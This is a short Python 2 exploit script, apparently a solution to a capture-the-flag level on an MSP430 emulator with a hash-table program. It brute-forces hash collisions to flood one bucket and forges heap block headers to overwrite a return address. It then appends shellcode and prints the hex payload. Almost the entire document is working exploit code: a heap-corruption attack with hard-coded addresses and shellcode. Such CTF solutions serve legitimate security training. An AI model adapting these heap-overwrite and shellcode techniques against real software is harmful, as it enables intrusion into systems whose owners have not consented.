# Molded after ghettohaxxx model - kudos to him

import struct  
# C data types and function library for Python
from ctypes import *  
# Module for specialized container data types
from collections import *  
from string import digits, ascii_uppercase, ascii_lowercase  
# Module for several iterator building blocks
from itertools import product

chars = digits + ascii_uppercase + ascii_lowercase

num_buckets = 1 << 3  
bucket_mask = num_buckets - 1

def iterstrings(prefix = ''):  
    for n in range(1, 15):
        for comb in product(chars, repeat = n):
            yield prefix + ''.join(comb)

def hash(s):  
    acc = c_int16(0)
    for c in s:
        val = c_int16(c_int8(ord(c)).value)
        if val.value == 0: break
        x = c_int16(acc.value + val.value)
        acc.value = x.value
        acc.value <<= 5
        acc.value -= x.value
    return acc.value & 0xffff

def get_fillers(bucket_idx, qty):  
    vals = []
    for i in iterstrings():
        if hash(i) & bucket_mask == bucket_idx:
            vals.append(i)
            if len(vals) == qty:
                break
    return vals

def make_collision(prefix, bucket_idx):  
    for i in iterstrings(prefix):
        if hash(i) & bucket_mask == bucket_idx:
            return i

def get_cmdstr(vals):  
    cmds = []
    for val in vals:
        cmds.append('new ' + val + ' 1;')
    return ''.join(cmds)

# 503c
bucket_to_fill = 0 
names = get_fillers(bucket_to_fill, 10) 
 
# Overwrite prev, next of header @ 6th element. Must be marked used, size irrelevant
fake_free_block_ptr = 0x50a2  
ptr_to_retaddr = 0x3dce  

# From rehash 486a from add_to_table
original_retaddr = 0x49a2   
# On stack of run()
new_retaddr = 0x3e60 

fake_prev_block_ptr = 0x508a  
fake_prev_block = struct.pack('<3H', ptr_to_retaddr - 4, 0x0101, 0xffff & ~1)  
names.insert(4, make_collision(fake_prev_block, bucket_to_fill))  

h1 = struct.pack('<3H', ptr_to_retaddr - 4, fake_free_block_ptr, (new_retaddr - 6 - original_retaddr) & 0xffff | 1)  

fake_free_block = struct.pack('<3H', fake_prev_block_ptr, 0x503c + (bucket_to_fill + 3) * 0x60, 0xffff & ~1)  

names.insert(5, make_collision(h1 + fake_free_block, bucket_to_fill))  

'''
Shellcode:
3240 00ff      mov	#0xff00, sr
3040 1000      br	#0x0010
'''
shellcode = '324000ff30401000'.decode('hex')  

cmdstr = get_cmdstr(names) + shellcode  
 
print cmdstr.encode('hex')  

